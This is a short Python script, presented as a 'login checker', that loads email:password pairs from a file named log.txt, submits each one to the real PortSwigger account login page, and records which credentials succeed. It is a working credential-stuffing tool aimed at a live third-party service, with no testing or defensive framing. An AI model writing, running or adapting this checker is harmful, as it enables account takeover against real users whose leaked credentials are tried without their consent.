#!/usr/bin/env python3
"""Minimal PortSwigger Login Checker"""

import requests
import re
import json
from datetime import datetime

BASE_URL = "https://login.portswigger.net"
LOGIN_URL = f"{BASE_URL}/u/login"

def extract_fields(html):
    """Extract form fields from HTML"""
    fields = {}
    for match in re.finditer(r'<input[^>]*>', html):
        name_match = re.search(r'name="([^"]+)"', match.group(0))
        value_match = re.search(r'value="([^"]*)"', match.group(0))
        if name_match:
            fields[name_match.group(1)] = value_match.group(1) if value_match else ""
    return fields

def check_login(email, password):
    """Check single login"""
    try:
        session = requests.Session()

        # GET /u/login
        resp = session.get(LOGIN_URL, timeout=30)
        if resp.status_code != 200:
            return "ERROR", f"GET failed: {resp.status_code}"

        # Extract form fields
        fields = extract_fields(resp.text)
        fields["username"] = email
        fields["password"] = password

        # POST
        resp = session.post(LOGIN_URL, data=fields, timeout=30, allow_redirects=False)

        if resp.status_code == 302:
            return "SUCCESS", resp.headers.get("Location", "")
        elif resp.status_code == 200:
            if "error" in resp.text.lower():
                return "INVALID", "Invalid credentials"
            else:
                return "FAILED", "Still on login page"
        else:
            return f"HTTP_{resp.status_code}", ""

    except requests.Timeout:
        return "TIMEOUT", ""
    except Exception as e:
        return "ERROR", str(e)

def main():
    """Main function"""
    results = []

    try:
        with open("log.txt", "r") as f:
            creds = [line.strip().split(":", 1) for line in f if ":" in line]
    except:
        print("ERROR: log.txt not found")
        return

    print(f"Testing {len(creds)} accounts...")
    print("-" * 60)

    for idx, (email, password) in enumerate(creds, 1):
        status, msg = check_login(email, password)
        results.append({"email": email, "status": status})

        symbol = "✓" if status == "SUCCESS" else "✗"
        print(f"[{idx}/{len(creds)}] {symbol} {email[:30]:30} | {status}")

    print("-" * 60)

    # Summary
    success = sum(1 for r in results if r["status"] == "SUCCESS")
    print(f"\nSuccessful: {success}/{len(creds)}")

    # Save results
    with open("results.json", "w") as f:
        json.dump({"results": results, "timestamp": datetime.now().isoformat()}, f, indent=2)

    print("Results saved to results.json")

if __name__ == "__main__":
    main()
